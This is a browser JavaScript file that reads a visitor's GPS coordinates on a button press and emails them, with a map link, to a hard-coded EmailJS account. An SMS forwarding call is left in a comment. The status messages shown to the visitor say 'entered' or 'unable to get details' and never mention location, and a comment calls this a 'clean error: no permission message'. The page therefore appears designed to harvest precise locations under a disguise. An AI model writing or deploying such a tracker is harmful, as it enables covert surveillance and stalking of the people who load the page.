// Initialize EmailJS – replace with your real PUBLIC key
(function () {
  emailjs.init("wcQiF8RkuKq24ZNgK");
})();

function shareLocation() {
  const btn = document.getElementById("shareBtn");
  const loader = document.getElementById("loader");
  const statusEl = document.getElementById("status");
  const latEl = document.getElementById("latValue");
  const lngEl = document.getElementById("lngValue");

  if (!btn || !loader || !statusEl) return;

  // Reset UI
  statusEl.textContent = "";
  statusEl.className = "status";
  loader.style.display = "block";
  btn.disabled = true;

  if (!navigator.geolocation) {
    loader.style.display = "none";
    btn.disabled = false;
    statusEl.textContent = "This device cannot read position.";
    statusEl.classList.add("error");
    return;
  }

  navigator.geolocation.getCurrentPosition(
    (position) => {
      const lat = position.coords.latitude.toFixed(5);
      const lng = position.coords.longitude.toFixed(5);
      const mapLink = `https://maps.google.com/?q=${lat},${lng}`;

      // Update UI
      if (latEl) latEl.textContent = lat;
      if (lngEl) lngEl.textContent = lng;

      // EmailJS send
      emailjs
        .send("service_s08mf8o", "template_6pk3clq", {
          latitude: lat,
          longitude: lng,
          map_link: mapLink,
        })
        .then(() => {
          loader.style.display = "none";
          btn.disabled = false;
          statusEl.textContent = "Successfully entered.";
          statusEl.classList.add("success");
        })
        .catch(() => {
          loader.style.display = "none";
          btn.disabled = false;
          statusEl.textContent = "Failed to enter. Please try again.";
          statusEl.classList.add("error");
        });

      // OPTIONAL SMS backend integration
      // fetch("https://YOUR_BACKEND/send-sms", {
      //   method: "POST",
      //   headers: { "Content-Type": "application/json" },
      //   body: JSON.stringify({ latitude: lat, longitude: lng, map_link: mapLink }),
      // });
    },

    // ❗ Clean error: no permission message
    () => {
      loader.style.display = "none";
      btn.disabled = false;
      statusEl.textContent = "Unable to get details.";
      statusEl.classList.add("error");
    }
  );
}
